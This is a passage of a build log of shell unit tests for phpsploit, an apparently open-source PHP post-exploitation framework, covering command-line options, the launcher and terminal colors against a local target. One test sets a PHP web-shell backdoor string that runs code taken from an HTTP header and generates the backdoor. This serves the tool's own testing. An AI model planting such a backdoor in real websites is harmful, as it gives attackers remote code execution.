$TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --source\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### succeed with VALID source file (even with an invalid command in the middle)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-src << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2malias test_alias 'lrun true' # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2mINVALID_COMMAND # this command should fail\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset EDITOR test_set\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --source $TMPFILE-src && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check existence of newly created alias\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --source $TMPFILE-src > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -s $TMPFILE-src -e 'alias' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m test_alias .* lrun true$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check that original $PHPSPLOIT_CONFIG_DIR IS loaded\u001b[m\n[Unit Tests/build]   | \u001b[33;2mnum_aliases=$(sed -e '1,/---/d' -e '/^$/,$d' $TMPFILE | wc -l)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$num_aliases\" -gt 1 ] || FAIL # aliases set by conf file should also exist\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check existence of newly created setting\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -s $TMPFILE-src -e 'set' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m EDITOR .* test_set$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# FAIL if called with non-existing source file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --source INVALID > /dev/null 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-src\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called without value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --source 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --eval\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --eval help && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### succeed if called with multiple valid commands\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --eval 'set; alias' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Configuration Settings$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Command Aliases$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called without value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --eval 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### --interactive\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-src << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2malias test_alias 'lrun true' # valid comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2mINVALID_COMMAND # this command should fail\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset EDITOR test_set\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --interactive --source $TMPFILE-src || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-src\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --interactive --eval help || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mis_interactive $PHPSPLOIT --interactive --target localhost || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check stdin correctly interpreted\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho exit | $PHPSPLOIT --interactive -e 'set; alias' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Configuration Settings$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Command Aliases$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfaketty $PHPSPLOIT --interactive -e exit > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### FAIL if called with argument\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtest_opt --interactive INVALID 2> $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_cli_error $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/command-line-options.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=73s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/issue73_show-stacktrace-if-VERBOSITY.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/issue73_show-stacktrace-if-VERBOSITY.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.aIfv6MAJed\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Issue #73: Show stack trace when VERBOSITY is True\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ref: https://github.com/nil0x42/phpsploit/issues/73\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mstacktrace='Traceback (most recent call last)'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this SHOULD NOT contain stack trace:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'set VERBOSITY False; source /' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"$stacktrace\" $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this SOULD contain stack trace:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'set VERBOSITY True; source /' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"$stacktrace\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/issue73_show-stacktrace-if-VERBOSITY.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=1s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/phpsploit-launcher.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/phpsploit-launcher.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.bBl7lZX8yi\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### func tests for phpsploit launcher (./phpsploit)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Early Ctrl-C interrupt (SIGINT)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m> $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# testing different timeouts because it depends on time needed\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# to load phpsploit for current platform/interpreter\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtimeout -s INT 0.05 $RAW_PHPSPLOIT --help > $TMPFILE-out 2>> $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtimeout -s INT 0.1 $RAW_PHPSPLOIT --help > $TMPFILE-out 2>> $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtimeout -s INT 0.15 $RAW_PHPSPLOIT --help > $TMPFILE-out 2>> $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mtimeout -s INT 0.2 $RAW_PHPSPLOIT --help > $TMPFILE-out 2>> $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[-\\] .* initialization interrupted$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-out\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Use phpsploit as a script's shebang\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-script << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#!$RAW_PHPSPLOIT\u001b[m\n[Unit Tests/build]   | \u001b[33;2msession\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchmod +x $TMPFILE-script\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$TMPFILE-script > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -qi '^phpsploit session' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# test with $PHPSPLOIT (to make coverage happy)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT $TMPFILE-script > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -qi '^phpsploit session' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-script\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/phpsploit-launcher.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=2s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/tty-colors.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/tty-colors.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.PhW9Jve0ob\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check that tty colors are rendered within a tty\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# and not rendered otherwise\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-src << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit source file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mhelp help\u001b[m\n[Unit Tests/build]   | \u001b[33;2mINV4LID_COMMAND\u001b[m\n[Unit Tests/build]   | \u001b[33;2msource /INV4LID_PATH\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset BACKDOOR \"@eval(\\$_SERVER['HTTP_%%PASSKEY%%'])\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset BACKDOOR\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset REQ_INTERVAL 1-10\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset REQ_INTERVAL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset VERBOSITY \"TRUE\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mset VERBOSITY \"FALSE\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexploit --get-backdoor\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcmd=\"$PHPSPLOIT -s $TMPFILE-src\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# raw output SHOULD NOT have ansi colors\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$cmd | rm_trailing_newlines | grep -v ' plugins correctly loaded' > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -Pq '\\033\\[' $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# tty output SHOULD have ansi colors\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfaketty $cmd | rm_trailing_newlines | grep -v ' plugins correctly loaded' > $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -Pq '\\033\\[' $TMPFILE-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# assert file contains at least 500 ansi colors\u001b[m\n[Unit Tests/build]   | \u001b[33;2mansi_colors=$(perl -lne 'END {print $c} $c += s/\\033\\[//g' $TMPFILE-2)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$ansi_colors\" -lt 500 ] && FAIL $ansi_colors\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ensure `exploit --get-backdoor` gets colored by pygments\u001b[m\n[Unit Tests/build]   | \u001b[33;2mansi_colors=$(grep -v BACKDOOR $TMPFILE-2 | grep HTTP_PHPSPL01T \\\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    | perl -lne 'END {print $c} $c += s/\\033\\[//g')\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$ansi_colors\" -lt 9 ] && FAIL $ansi_colors\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# both should be equal after removing ansi colors\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdecolorize $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE $TMPFILE-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/interface/tty-colors.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=1s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | 